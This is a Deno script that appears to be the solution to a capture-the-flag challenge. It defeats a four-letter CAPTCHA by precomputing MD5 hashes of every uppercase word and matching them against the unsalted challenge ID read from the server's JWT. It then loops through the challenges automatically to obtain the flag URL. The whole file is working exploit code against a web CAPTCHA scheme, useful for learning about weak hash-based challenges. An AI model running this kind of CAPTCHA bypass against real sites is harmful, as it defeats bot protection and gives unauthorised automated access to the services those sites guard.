#!/usr/bin/env -S deno run

// The premise of this challenge is that, since the CAPTCHAs are only four
// characters long and only contain uppercase letters, there only exist
// some 26^4 (<500,000) permutations. Since there is no salt, these values
// can be trivially precomputed and matched against the "challenge ID",
// which is just the MD5 hash of the correct answer (it is stored in a JWT
// that the server sends to the client to keep the state).

import { crypto } from 'https://deno.land/std@0.216.0/crypto/mod.ts'

const ALPHABET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'

const base = prompt('Enter server URL (i.e. https://example.com):')

const rainbowTable = new Map()

for (const a of ALPHABET) {
    for (const b of ALPHABET) {
        for (const c of ALPHABET) {
            for (const d of ALPHABET) {
                const word = a + b + c + d
                const hash = [...new Uint8Array(await crypto.subtle.digest(
                    'md5',
                    new TextEncoder().encode(word)
                ))]
                rainbowTable.set(
                    hash
                        .map(byte => byte.toString(16).padStart(2, '0'))
                        .join(''),
                    word
                )
            }
        }
    }
}

const updateCaptcha = async body => {
    const response = await fetch(new URL('/captcha', base), {
        method: 'POST',
        body: JSON.stringify(body),
        headers: { 'content-type': 'application/json' }
    })

    return await response.json()
}

let captchaData = await updateCaptcha({ routeId: '/flag' })

while (!captchaData.done) {
    // No need for proper JWT parsing/verification here
    const jwtPayload = captchaData.captchaToken.split('.')[1]
    const { challengeId } = JSON.parse(atob(jwtPayload))

    captchaData = await updateCaptcha({
        captchaToken: captchaData.captchaToken,
        word: rainbowTable.get(challengeId)
    })
}

// The depleted token is used to prove that the CAPTCHA has been
// completed and gain access to the page.
console.log('Done! Open this URL to get the flag:')
console.log(new URL('/flag?token=' + captchaData.captchaToken, base).href)
